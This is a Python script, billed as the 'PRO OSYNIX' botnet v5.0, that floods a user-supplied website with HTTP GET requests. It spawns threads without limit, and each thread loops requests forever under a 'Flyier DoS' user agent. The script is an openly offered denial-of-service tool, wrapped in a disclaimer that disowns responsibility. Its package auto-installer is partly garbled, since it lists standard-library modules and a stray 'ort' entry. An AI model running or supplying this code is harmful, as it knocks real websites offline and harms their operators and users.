import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os

required_packages = [
    'requests',
    'pystyle',
    'multiprocess',
    'subprocess',
    'sys',
    'time',
    'threading',
    'colorama',
    'aiohttp',
    'ort',  # Note: 'ort aiohttp' and 'asyncio' should be separated
    'asyncio'
]

# Check if a package is installed
def is_package_installed(package):
    try:
        __import__(package)
        return True
    except ImportError:
        return False

# Install missing packages
def install_missing_packages():
    for package in required_packages:
        if not is_package_installed(package):
            print(f"Installing {package}...")
            subprocess.call([sys.executable, "-m", "pip", "install", package])

if __name__ == "__main__":
    install_missing_packages()

# The rest of your main.py script goes here

#//Gui Start//#
 

headers = {
  "User-Agent": "Flyier DoS"
}

osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
print("""
{+} Disclaimer:
This Python tool is provided for your convenience, but it is to be used entirely at your own risk. The owner of this tool disclaims all responsibility for any consequences or damages that may result from its use.

By using this tool, you agree to absolve the owner of any liability, and you accept full responsibility for any outcomes or issues that may arise during its use.

Please exercise caution and ensure you fully understand the tool's functionality before proceeding. If you do not agree with these terms, you should refrain from using the tool.

~Thanks.

Now Booting UP the Botnet...""")
time.sleep(3.0)


if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''
██████╗ ██████╗  ██████╗      ██████╗ ███████╗██╗   ██╗███╗   ██╗██╗██╗  ██╗
██╔══██╗██╔══██╗██╔═══██╗    ██╔═══██╗██╔════╝╚██╗ ██╔╝████╗  ██║██║╚██╗██╔╝
██████╔╝██████╔╝██║   ██║    ██║   ██║███████╗ ╚████╔╝ ██╔██╗ ██║██║ ╚███╔╝ 
██╔═══╝ ██╔══██╗██║   ██║    ██║   ██║╚════██║  ╚██╔╝  ██║╚██╗██║██║ ██╔██╗ 
██║     ██║  ██║╚██████╔╝    ╚██████╔╝███████║   ██║   ██║ ╚████║██║██╔╝ ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                                                                            


[!] Luke 10:18 He replied, “I saw Satan fall like lightning from heaven."
[!] Lucifer was Inoocent
[!] Better to region in Hell than to serve in Heaven.

{+} Powerful BOTNET Developed By @ProOsynix           
 '''




banner = r"""
v5.0""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

 

 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
#//Gui End//#
num = 0
reqs = []
loop = asyncio.new_event_loop()
r = 0
url = input("{?} Enter Website URL --> ")
print()
time.sleep(1)
if url.startswith("http") or url.startswith("https"):
  pass
else:
  url = "http://"+url

  print(url)
async def fetch(session, url):
    global r, reqs
    start = int(time.time())
    while True:
      async with session.get(url, headers=headers) as response:
        if response:
          set_end = int(time.time())
          set_final = start - set_end
          final = str(set_final).replace("-", "")
 
          if response.status == 200:
            r += 1
          reqs.append(response.status)
          sys.stdout.write(f"Requests : {str(len(reqs))} | Time : {final} | Response Status Code => {str(response.status)}\r")
        else:
          print(Colorate.Horizontal(Colors.red_to_green, "[-] Server is not responding"))



urls = []
urls.append(url)

async def main():
  tasks = []
  async with aiohttp.ClientSession() as session:
    for url in urls:
      tasks.append(fetch(session, url))
    ddos = await asyncio.gather(*tasks)

def run():
    loop.run_forever(asyncio.run(main()))


if __name__ == '__main__':
  active = []
  ths = []
  while True:
    try:
      while True:
        th = threading.Thread(target=run)
        try:
          th.start()
          ths.append(th)
          sys.stdout.flush()
        except RuntimeError:
          pass
    except:
      pass
